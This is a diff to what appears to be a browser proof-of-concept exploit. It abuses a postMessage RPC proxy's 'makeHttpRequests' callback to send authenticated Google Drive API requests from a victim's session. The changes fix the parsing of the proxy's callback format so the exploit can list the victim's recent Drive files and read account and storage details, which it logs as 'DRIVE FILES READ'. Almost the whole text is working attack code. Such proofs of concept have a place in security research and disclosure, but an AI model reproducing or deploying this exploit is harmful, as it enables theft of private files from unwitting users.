@@ -149,26 +149,27 @@ window.addEventListener('message', function(e) {
   }
 
   // ---- Handle makeHttpRequests callback ----
-  // Proxy responds: {f:"_callbacks_.poc-req-1", a:[null, responses], s:"..", ...}
+  // Actual callback format: {s:"__cb", f:"", c:N, a:[callId, responseMapJSON]}
+  // responseMapJSON = JSON string of {"/relative/url": {data:{status,body}}}
   if (responseHandled) return;
-  if (!msg.f || !msg.f.includes('_callbacks_')) return;
+  if (msg.s !== '__cb') return;
 
-  log('ok', 'Callback received for: ' + msg.f);
-  const [err, responses] = Array.isArray(msg.a) ? msg.a : [null, null];
+  log('ok', '__cb received, callId=' + msg.a[0]);
 
-  if (err) { log('warn', 'RPC error: ' + JSON.stringify(err)); return; }
-  if (!Array.isArray(responses) || responses.length === 0) {
-    log('warn', 'Empty responses: ' + JSON.stringify(msg.a)); return;
+  let responseMap;
+  try { responseMap = JSON.parse(msg.a[1]); } catch(e) {
+    log('warn', 'Failed to parse response map: ' + String(msg.a[1]).substring(0, 200)); return;
   }
 
-  responses.forEach((resp, idx) => {
-    if (!resp) return;
-    log('ok', '[' + idx + '] HTTP ' + resp.status + ' (' + (resp.statusText||'') + ')');
+  Object.entries(responseMap).forEach(([relUrl, wrapper]) => {
+    const status = wrapper.data && wrapper.data.status;
+    const bodyStr = wrapper.data && wrapper.data.body;
+    log('ok', '[' + relUrl.substring(0,40) + '] HTTP ' + status);
 
-    if (resp.status === 200 && resp.body) {
+    if (status === 200 && bodyStr) {
       responseHandled = true;
       let data;
-      try { data = JSON.parse(resp.body); } catch(e) { data = { raw: resp.body }; }
+      try { data = JSON.parse(bodyStr); } catch(e) { data = { raw: bodyStr }; }
 
       if (data.files) {
         log('ok', '✅ DRIVE FILES READ! Count: ' + data.files.length);
@@ -185,12 +186,12 @@ window.addEventListener('message', function(e) {
       } else {
         log('ok', '✅ Response: ' + JSON.stringify(data).substring(0, 400));
       }
-    } else if (resp.status === 401) {
-      log('warn', '401 — not logged in, or SAPISIDHASH failed. Body: ' + resp.body);
-    } else if (resp.status === 403) {
-      log('warn', '403 — ' + resp.body);
+    } else if (status === 401) {
+      log('warn', '401 — not logged in, or SAPISIDHASH failed.');
+    } else if (status === 403) {
+      log('warn', '403 — ' + String(bodyStr).substring(0, 200));
     } else {
-      log('warn', 'Status ' + resp.status + ': ' + String(resp.body).substring(0, 300));
+      log('warn', 'Status ' + status + ': ' + String(bodyStr).substring(0, 300));
     }
   });
 });
@@ -204,21 +205,19 @@ function sendMakeHttpRequests() {
 
   const requests = [
     {
-      url: '/drive/v3/files' +
+      relative_url: '/drive/v3/files' +
            '?key=' + DRIVE_KEY +
            '&fields=files(id,name,mimeType,modifiedTime,size,webViewLink,parents)' +
            '&pageSize=20&orderBy=modifiedTime+desc',
       method: 'GET',
       headers: {},
-      body: null,
-      responseExpected: true
+      body: null
     },
     {
-      url: '/drive/v3/about?key=' + DRIVE_KEY + '&fields=user,storageQuota',
+      relative_url: '/drive/v3/about?key=' + DRIVE_KEY + '&fields=user,storageQuota',
       method: 'GET',
       headers: {},
-      body: null,
-      responseExpected: true
+      body: null
     }
   ];
 
